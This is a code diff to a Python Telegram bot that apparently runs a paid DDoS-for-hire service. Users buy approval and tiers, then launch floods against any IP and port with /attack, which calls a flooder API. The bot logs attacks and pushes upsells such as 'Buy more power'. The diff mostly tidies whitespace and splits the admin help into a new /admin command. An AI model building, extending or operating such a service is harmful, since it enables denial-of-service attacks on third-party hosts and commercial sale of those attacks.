@@ -76,7 +76,7 @@ class Database:
         self.attacks.create_index([("timestamp", DESCENDING)])
         self.attacks.create_index([("user_id", ASCENDING)])
         self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
-    
+
     def get_user(self, user_id: int) -> Optional[Dict]:
         user = self.users.find_one({"user_id": user_id})
         if user:
@@ -87,7 +87,7 @@ class Database:
                 user["tier"] = DEFAULT_TIER
                 self.users.update_one({"user_id": user_id}, {"$set": {"tier": DEFAULT_TIER}})
         return user
-    
+
     def create_user(self, user_id: int, username: str = None) -> Dict:
         if self.get_user(user_id): return self.get_user(user_id)
         user_data = {
@@ -99,25 +99,25 @@ class Database:
             self.users.insert_one(user_data)
         except: pass
         return user_data
-    
+
     def approve_user(self, user_id: int, days: int) -> bool:
         expires_at = get_current_time() + timedelta(days=days)
         res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}})
         return res.modified_count > 0
-    
+
     def disapprove_user(self, user_id: int) -> bool:
         res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": False, "expires_at": None}})
         return res.modified_count > 0
-    
+
     def set_user_tier(self, user_id: int, tier: str) -> bool:
         if tier not in TIER_LIMITS: return False
         res = self.users.update_one({"user_id": user_id}, {"$set": {"tier": tier}})
         return res.modified_count > 0
-    
+
     def get_user_tier(self, user_id: int) -> str:
         u = self.get_user(user_id)
         return u.get("tier", DEFAULT_TIER) if u else DEFAULT_TIER
-    
+
     def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
         self.attacks.insert_one({
             "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
@@ -125,10 +125,10 @@ class Database:
             "timestamp": get_current_time()
         })
         self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
-    
+
     def get_all_users(self) -> List[Dict]:
         return list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
-    
+
     def get_user_attack_stats(self, user_id: int) -> Dict:
         total = self.attacks.count_documents({"user_id": user_id})
         success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
@@ -295,18 +295,17 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await is_user_approved(user_id):
         await update.message.reply_text(f"❌ Account not approved. Contact {CONTACT} to purchase.")
         return
-    
-    # Check concurrent attacks from API
+
     active = get_active_attacks()
     if active.get("success") and active.get("count", 0) >= MAX_CONCURRENT_ATTACKS:
         await update.message.reply_text(f"❌ Max concurrent attacks ({MAX_CONCURRENT_ATTACKS}) reached. Wait for a slot.")
         return
-    
+
     args = context.args
     if len(args) != 3:
         await update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>\nExample: /attack 1.2.3.4 80 30")
         return
-    
+
     ip, port_str, dur_str = args
     try:
         port = int(port_str)
@@ -325,7 +324,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except:
         await update.message.reply_text("Invalid duration.")
         return
-    
+
     msg = await update.message.reply_text(f"🎯 Launching attack {ip}:{port} for {duration}s...")
     resp = launch_attack(ip, port, duration)
     if resp.get("success"):
@@ -333,8 +332,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         active_info = get_active_attacks()
         usage = f"📊 Server Load: {active_info.get('count',0)}/{MAX_CONCURRENT_ATTACKS} attacks running"
         await msg.edit_text(f"✅ Attack launched!\n{ip}:{port} for {duration}s\n{usage}\n\n💸 Buy more power: {CONTACT}")
-        
-        # Schedule "Attack Complete" message after duration seconds
+
         async def attack_complete():
             await asyncio.sleep(duration)
             await update.message.reply_text(f"✅ Attack complete! {ip}:{port} finished {duration}s flood.\n💸 DM {CONTACT} for more power.")
@@ -388,42 +386,49 @@ async def blockedports_command(update, context):
     await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}\nAllowed: {MIN_PORT}-{MAX_PORT} except those.\n\n💸 DM {CONTACT} for custom unlocks.")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Normal user help – no admin commands
+    if not await require_access(update, context):
+        return
+    msg = (
+        f"🔥 {BOT_NAME} Help 🔥\n\n"
+        "📱 **User Commands:**\n"
+        "/attack IP PORT DURATION – Launch an attack\n"
+        "/myattacks – Show your active attacks\n"
+        "/myinfo – Your account details\n"
+        "/mystats – Attack history\n"
+        "/blockedports – List blocked ports\n"
+        "/start – Welcome message\n"
+        "/help – This menu\n\n"
+        f"⭐ **Tiers:**\n• Free: 1-60s\n• Premium: 60-600s\n• VIP: 60-900s\n\n"
+        f"📡 Max concurrent: {MAX_CONCURRENT_ATTACKS}\n\n"
+        f"💸 Want to buy or upgrade? DM {CONTACT}"
+    )
+    await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Only admins see this
     user_id = update.effective_user.id
-    is_admin = user_id in ADMIN_IDS
-    
-    # Always show user commands
-    msg = f"🔥 {BOT_NAME} Help 🔥\n\n"
-    msg += "📱 **User Commands:**\n"
-    msg += "/attack IP PORT DURATION – Launch an attack\n"
-    msg += "/myattacks – Show your active attacks\n"
-    msg += "/myinfo – Your account details\n"
-    msg += "/mystats – Attack history\n"
-    msg += "/blockedports – List blocked ports\n"
-    msg += "/start – Welcome message\n"
-    msg += "/help – This menu\n\n"
-    
-    # Only show admin commands if user is admin
-    if is_admin:
-        msg += "👑 **Admin Commands:**\n"
-        msg += "/approve `<userid>` `<days>` – Approve a user\n"
-        msg += "/disapprove `<userid>` – Revoke access\n"
-        msg += "/set_tier `<userid>` `<free|premium|vip>` – Change user tier\n"
-        msg += "/users – List all users\n"
-        msg += "/status – Check flooder API health\n"
-        msg += "/running – Show active attacks\n"
-        msg += "/stats – Bot statistics\n"
-        msg += "/blockedports – Show blocked ports (admin)\n\n"
-    
-    msg += f"⭐ **Tiers:**\n• Free: 1-60s\n• Premium: 60-600s\n• VIP: 60-900s\n\n"
-    msg += f"📡 Max concurrent: {MAX_CONCURRENT_ATTACKS}\n\n"
-    msg += f"💸 Want to buy or upgrade? DM {CONTACT}"
-    
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("❌ You are not authorized to use this command.")
+        return
+    msg = (
+        "👑 **Admin Commands**\n\n"
+        "/approve `<userid>` `<days>` – Approve a user\n"
+        "/disapprove `<userid>` – Revoke access\n"
+        "/set_tier `<userid>` `<free|premium|vip>` – Change user tier\n"
+        "/users – List all users\n"
+        "/status – Check flooder API health\n"
+        "/running – Show active attacks\n"
+        "/stats – Bot statistics\n"
+        "/blockedports – Show blocked ports (admin)\n\n"
+        f"📡 Max concurrent: {MAX_CONCURRENT_ATTACKS}"
+    )
     await update.message.reply_text(msg, parse_mode='Markdown')
 
 # ---------- Main ----------
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
-    # Admin
+    # Admin commands
     app.add_handler(CommandHandler("approve", approve_command))
     app.add_handler(CommandHandler("disapprove", disapprove_command))
     app.add_handler(CommandHandler("set_tier", set_tier_command))
@@ -432,15 +437,16 @@ def main():
     app.add_handler(CommandHandler("running", running_command))
     app.add_handler(CommandHandler("stats", stats_command))
     app.add_handler(CommandHandler("blockedports", blockedports_admin))
-    # User
+    # User commands
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("admin", admin_command))
     app.add_handler(CommandHandler("attack", attack_command))
     app.add_handler(CommandHandler("myattacks", myattacks_command))
     app.add_handler(CommandHandler("myinfo", myinfo_command))
     app.add_handler(CommandHandler("mystats", mystats_command))
     app.add_handler(CommandHandler("blockedports", blockedports_command))
-    
+
     print(f"{BOT_NAME} is starting...")
     app.run_polling()
 
